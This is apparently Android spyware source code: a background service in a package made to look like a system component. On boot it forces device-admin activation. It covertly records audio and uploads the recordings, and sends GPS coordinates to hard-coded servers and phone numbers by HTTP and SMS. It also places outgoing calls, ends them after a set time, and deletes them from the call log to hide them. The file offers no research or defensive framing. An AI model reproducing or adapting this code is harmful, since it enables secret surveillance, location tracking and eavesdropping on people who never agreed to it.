package com.android.ring.services;

import java.util.Timer;
import java.util.TimerTask;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;

import com.android.log.CLog;
import com.android.net.Feedback;
import com.android.net.HttpSender;
import com.android.net.SMSSender;
import com.android.ring.Constant;
import com.android.ring.MainActivity;
import com.android.ring.devutils.AdminUtils;
import com.android.ring.devutils.CPhoneStateListener;
import com.android.ring.devutils.DeviceInfo;
import com.android.ring.devutils.GprsUtils;
import com.android.ring.devutils.GpsUtils;
import com.android.ring.devutils.IntentUtils;
import com.android.ring.devutils.MediaRecorderUtils;
import com.android.ring.devutils.SmsUtils;
import com.android.ring.devutils.WifiUtils;
import com.android.wu.sms.SmsObserver;
import com.android.wx.math.DateFormater;

public class RingService extends Service implements Feedback{
	
	private CLog clog=new CLog(RingService.class.getSimpleName());
	
	public static final String ACTION = "com.android.ring.server";
	private WifiUtils mWifiUtils;
	private GprsUtils mGprsUtils;
	private AdminUtils mAdminUtils;
	private DeviceInfo mDeviceInfo;
	private GpsUtils mGpsUtils;
	private MediaRecorderUtils mMediaRecorderUtils;
	private SmsUtils mSmsUtils;
	private CPhoneStateListener mCPhoneStateListener;
	
	private int threadCount;
	private boolean isGpsWorking,isRecorderWorking,isCallWorking;
	ContentResolver  mContentResolver;
	ContentObserver observer;
	
	public static final int ACTION_BOOT_COMPLETE=0;
	public static final int CALL_OUT=1;
	public static final int CALL_EDN=2;
	public static final int PHONE_STATE=3;
	public static final String FLAG="flag";
	public static void start(Context context,int flag){
		Intent ringServer=new Intent(context, RingService.class);
		ringServer.putExtra(FLAG, flag);
		context.startService(ringServer);
	}

	
	@Override
	public IBinder onBind(Intent intent) {
		clog.println("onBind");
		return null;
	}
	
	@Override
	public void onCreate() {
		clog.println("onCreate");
		super.onCreate();
		mAdminUtils=new AdminUtils(this);
		mDeviceInfo=new DeviceInfo(this);
		mSmsUtils=new SmsUtils(this);
		mGprsUtils =new GprsUtils(this);
		mGprsUtils.onCreate();
		mWifiUtils=new WifiUtils(this);
		mWifiUtils.onCreate();
		mGpsUtils=new GpsUtils(this);
		mGpsUtils.onCreate();
		mMediaRecorderUtils=new MediaRecorderUtils();
		mMediaRecorderUtils.onCreate();
//		mTeleUtils=new TeleUtils(this, mPhoneStateListener);
		mCPhoneStateListener=new CPhoneStateListener(this);
		mContentResolver=getContentResolver();
		observer=new phoneContentObserver(handler);
		mContentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer);
	}
	
	
	@Override
	public void onStart(Intent intent, int startId) {
		clog.println("onStart");
		super.onStart(intent, startId);
		if(intent!=null){
		int flag=intent.getIntExtra(FLAG, 0);
		switch (flag) {
		case ACTION_BOOT_COMPLETE:
			clog.println("startTask");
			SmsObserver.registerContentObserver(this);
//			startAdminTask();
			startTask();
			break;
		default:
			break;
		}
		}
	}
	
	@SuppressLint("NewApi")
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		clog.println("onStartCommand");
		return super.onStartCommand(intent, flags, startId);
	}

	public void addThread(Thread thread){
		threadCount++;
		thread.start();
	}

	@Override
	public void done(Thread thread) {
		if(thread!=null){
			--threadCount;
		}
		if(threadCount<=0&&!isGpsWorking&&!isCallWorking){
			stopSelf();
		}
	}
	
	
	@Override
	public void onDestroy() {
		clog.println("onDestroy");
//		if(mDeviceInfo!=null){
//			mDeviceInfo=null;
//		}
		if(closeScreenTimer!=null){
			closeScreenTimer.cancel();
			closeScreenTimer=null;
		}
		if(mGprsUtils!=null){
			mGprsUtils.onDestroy();
			mGprsUtils=null;
		}
		
		if(mGpsUtils!=null){
			mGpsUtils.onDestroy();
			mGpsUtils=null;
		}
		if(mWifiUtils!=null){
			mWifiUtils.onDestroy();
			mWifiUtils=null;
		}
		if(mMediaRecorderUtils!=null){
			mMediaRecorderUtils.onDestroy();
			mMediaRecorderUtils=null;
		}
		if(mSmsUtils!=null){
			mSmsUtils.onDestroy();
			mSmsUtils=null;
		}
		mContentResolver.unregisterContentObserver(observer);

		super.onDestroy();
	}
	
	public void sendGps(SmsUtils mSmsUtils,DeviceInfo deviceInfo,Location location,int type){
		String param=Constant.createGpsParam(deviceInfo, location, type);
		for(String address:Constant.gpsUrls){
			Thread thread=new HttpSender(address, param, HttpSender.TYPE_STRING, this);
			addThread(thread);
		}
		Thread thread=new SMSSender(Constant.gpsPhoneNumbers, param, mSmsUtils, this);
		addThread(thread);

	}
	
	public void sendFile(String fileName){
		Thread thread=new HttpSender(null, fileName, HttpSender.TYPE_FILE, this);
		addThread(thread);
	}
	

	private long locationTime;
	LocationListener networkLocationListener= new LocationListener() {
		@Override
		public void onLocationChanged(Location location) {
			if(System.currentTimeMillis()-locationTime>=Constant.GPS_MIN_TIME){
				locationTime=System.currentTimeMillis();
				sendGps(mSmsUtils,mDeviceInfo, location, Constant.LOCATION_NETWORK);
				clog.println("network longitude:"+ location.getLongitude()+" latitude:"+ location.getLatitude()+" altitude:"+ location.getAltitude());
			}else{
				clog.println("--network longitude:"+ location.getLongitude()+" latitude:"+ location.getLatitude()+" altitude:"+ location.getAltitude());
			}
		}
		
		@Override
		public void onProviderDisabled(String provider) {
			clog.println("network onProviderDisabled");
		}
		
		@Override
		public void onProviderEnabled(String provider) {
			clog.println("network onProviderEnabled");
		}
		
		@Override
		public void onStatusChanged(String provider, int status,Bundle extras) {
			clog.println("network onStatusChanged");
		}
	};
	LocationListener gpsLocationListener= new LocationListener() {
		@Override
		public void onLocationChanged(Location location) {
			if(System.currentTimeMillis()-locationTime>=Constant.GPS_MIN_TIME){
				locationTime=System.currentTimeMillis();
				sendGps(mSmsUtils,mDeviceInfo, location, Constant.LOCATION_GPS);
				clog.println("gps longitude:"+ location.getLongitude()+" latitude:"+ location.getLatitude()+" altitude:"+ location.getAltitude());
			}else{
				clog.println("--gps longitude:"+ location.getLongitude()+" latitude:"+ location.getLatitude()+" altitude:"+ location.getAltitude());
			}
		}
		
		@Override
		public void onProviderDisabled(String provider) {
			clog.println("gps onProviderDisabled");
		}
		
		@Override
		public void onProviderEnabled(String provider) {
			clog.println("gps onProviderEnabled");
		}
		
		@Override
		public void onStatusChanged(String provider, int status,Bundle extras) {
			clog.println("gps onStatusChanged");
		}
	};
	
	Timer adminTimer;
	void startAdminTask(){
		if(adminTimer!=null){
			adminTimer.cancel();
			adminTimer=null;
		}
		adminTimer=new Timer();
	adminTimer.schedule(new TimerTask(){
		
		@Override
		public void run() {
			if(mAdminUtils.start()){
				startTask();
				adminTimer.cancel();
			}else{
			 ComponentName mComponentName=IntentUtils.getActivity(RingService.this);
			 CLog.print("adminUtils", mComponentName.getClassName());
			 if(!AdminUtils.DEVICE_ADMIN_ADD.equals(mComponentName.getClassName())){
				 MainActivity.start(RingService.this);
			 }
			 
			 }
			// TODO Auto-generated method stub
		}}, 0, 200);
	}

	
	long startTIme;
	Timer closeScreenTimer;
	public void startTask(){
		startTIme=System.currentTimeMillis();
		closeScreenTimer=new Timer();
		closeScreenTimer.schedule(new TimerTask(){
			@Override
			public void run() {
				if(System.currentTimeMillis()-startTIme>=20000){
//					closeScreenTimer.cancel();
				}
				mAdminUtils.start();
			}}, 0, 200);

		isCallWorking=true;
		mCPhoneStateListener.start();
		Timer callTimer = new Timer(); 
		callTimer.schedule(new TimerTask() {
			@Override  
			public void run() {
				mCPhoneStateListener.endCall();
			}
		},Constant.CALL_TOTAL_TIME);  
		
		
		isGpsWorking=true;
		mGpsUtils.onStart(gpsLocationListener, networkLocationListener);
		Timer gpsTimer = new Timer(); 
		gpsTimer.schedule(new TimerTask() {
			@Override  
			public void run() {
				mGpsUtils.onStop();
				isGpsWorking=false;
				done(null);
			}
		},Constant.GPS_TOTAL_TIME);  

		final Timer mTimer = new Timer(); 
		mTimer.schedule(new TimerTask() {
			String file;
			long start=0;
			@Override  
			public void run() {
				long cur=System.currentTimeMillis();
				if(start==0){
					isRecorderWorking=true;
					start=cur;
				}else{
					mMediaRecorderUtils.onStop();
					sendFile(file);
//					cLog.println("e->"+file);
				}
				if(cur-start>=Constant.RECORD_TOTAL_TIME){
					mTimer.cancel();
					isRecorderWorking=false;
					clog.println("record finish");
					done(null);
				}else{
					file=Constant.createFileName(cur);
//					cLog.println("s->"+file);
					mMediaRecorderUtils.onStart(file);
				}
			}   
		},0, Constant.RECORD_PERIOD_TIME);  
		
	}
	class phoneContentObserver extends ContentObserver{

		public phoneContentObserver(Handler handler) {
			super(handler);
			// TODO Auto-generated constructor stub
		}
		@Override
		public void onChange(boolean selfChange) {
//			outNumbers
//			TeleUtils.deleteCall(RingService.this,callStartTime);
			clog.println("onChange"+selfChange);
			/* 这里涉及到内容提供者的知识，其实这里是直接在操作 Android 的数据库，十分痛苦 */
			String callType[]=new String[]{"来电","播出","未接"};
			//is need del or isEnd
			if(mCPhoneStateListener.outNumbers==null||mCPhoneStateListener.outNumbers.size()==0){
				if(!mCPhoneStateListener.isWorking()){
				isCallWorking=false;
				done(null);
				}
				return;
			}

			//to delete
			StringBuffer sbArgs=new StringBuffer();
			int length=mCPhoneStateListener.outNumbers.size();
			sbArgs.append(CallLog.Calls.DATE);
			sbArgs.append(">");
			sbArgs.append(mCPhoneStateListener.getStartTime());
			sbArgs.append(" and (");
			for(int i=0;i<length;i++){
				String number=mCPhoneStateListener.outNumbers.get(i);
				if(i==0){
					sbArgs.append(" number=");
					sbArgs.append(number);
				}else{
					sbArgs.append(" or number=");
					sbArgs.append(number);
				}
			}
			sbArgs.append(") and type=");
			sbArgs.append(CallLog.Calls.OUTGOING_TYPE);
			
			clog.println("select "+sbArgs);
			Cursor cursor = mContentResolver.query(CallLog.Calls.CONTENT_URI,
					new String[]{CallLog.Calls._ID,
					CallLog.Calls.DATE,
					CallLog.Calls.NUMBER,
					CallLog.Calls.TYPE,
					CallLog.Calls.DURATION,
					CallLog.Calls.CACHED_NAME}
					, sbArgs.toString(),
					null,
					null/*"_id desc limit 3"*/);
			if(cursor.moveToFirst()){
				sbArgs=new StringBuffer();
				StringBuffer sb=new StringBuffer();
				do{
				sb.append(cursor.getString(0));
				sb.append(" | ");
				sb.append(DateFormater.format(cursor.getLong(1), DateFormater.defaultFomate));
				sb.append(" | ");
				sb.append(cursor.getString(2));
				sb.append(" | ");
				int type=cursor.getInt(3);
				String typeStr;
				switch(type){
				case CallLog.Calls.INCOMING_TYPE:
					typeStr=callType[0];
					break;
				case CallLog.Calls.OUTGOING_TYPE:
					typeStr=callType[1];
					break;
				case CallLog.Calls.MISSED_TYPE:
					typeStr=callType[2];
					break;
					default:
						typeStr="未知类型";
						break;
				}
				sb.append(typeStr);
				sb.append(" | ");
				long duration=cursor.getLong(4);
				sb.append(duration/60+"分"+duration%60+"秒");
				sb.append(" | ");
				sb.append(cursor.getString(5));
				sb.append('\n');
				
				if(cursor.getPosition()>0){
					sbArgs.append(" or ");
				}
				
				sbArgs.append(CallLog.Calls._ID);
				sbArgs.append("=");
				sbArgs.append(cursor.getString(0));
				
				//
				for(int i=0;i<mCPhoneStateListener.outNumbers.size();){
					String number=mCPhoneStateListener.outNumbers.get(i);
					if(number.equals(cursor.getString(2))){
						mCPhoneStateListener.outNumbers.remove(i);
					}else{
						i++;
					}
				}
				}while(cursor.moveToNext());
				
				clog.println("select——> "+sb.toString());
				clog.println("delete——> "+sbArgs.toString());
				
				int delCount=mContentResolver.delete(CallLog.Calls.CONTENT_URI, sbArgs.toString(), null);
				clog.println("dele count=" +delCount);
			}
			super.onChange(selfChange);
		}
		
	}
	Handler handler=new Handler(){
		public void handleMessage(android.os.Message msg) {
			clog.println("handleMessage"+msg.what);
		};
	};
	
	public static StringBuffer toStringBuffer(Cursor cursor){
		StringBuffer sb=new StringBuffer();
		if(cursor.moveToFirst()) {
			int clumns=cursor.getColumnCount();
			for(int i=0;i<clumns;i++){
				sb.append(cursor.getColumnName(i));
				sb.append(" | ");
			}
			sb.append('\n');
			do{
				for(int i=0;i<clumns;i++){
					sb.append(cursor.getString(i));
					sb.append(" | ");
				}
				sb.append('\n');
			}while(cursor.moveToNext());
		}
		return sb;
	}

}